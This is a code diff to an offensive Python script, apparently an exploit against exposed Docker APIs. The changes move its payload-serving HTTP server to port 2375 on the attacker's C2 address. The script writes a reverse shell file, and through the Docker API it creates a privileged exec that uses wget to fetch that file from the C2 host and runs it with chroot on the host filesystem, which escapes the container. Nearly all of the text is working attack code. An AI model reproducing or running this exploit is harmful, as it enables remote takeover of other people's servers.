@@ -22,7 +22,7 @@ def attack(target, port, containerID, c2):
     f = open("shell.sh", "w+")
     f.write(revShell)
     f.close()
-    httpsrv = Popen(['python3', '-m', 'http.server', '80'])
+    httpsrv = Popen(['python3', '-m', 'http.server', '2375', '--bind', c2.split(":")[0]])
     print('[+] Phew, alright. Creating the EXEC to trigger shell.\n')
 
 
@@ -30,12 +30,12 @@ def attack(target, port, containerID, c2):
         "AttachStdin": True,
         "AttachStdout": True,
         "AttachStderr": True,
-        "Cmd": ["/bin/sh", "-c", "wget http://" + c2.split(":")[0] + "/shell.sh -O /host/tmp/shell.sh; chroot /host bash /tmp/shell.sh"],
+        "Cmd": ["/bin/sh", "-c", "wget http://" + c2.split(":")[0] + ":2375/shell.sh -O /host/tmp/shell.sh; chroot /host bash /tmp/shell.sh"],
         "DetachKeys": "ctrl-p,ctrl-q",
         "Privileged": True,
         "Tty": True,
     })
-    
+
     dockerConnection.request('POST', '/containers/' + containerID[0] + '/exec', execJSON, headers)
     execResponse = dockerConnection.getresponse()
     
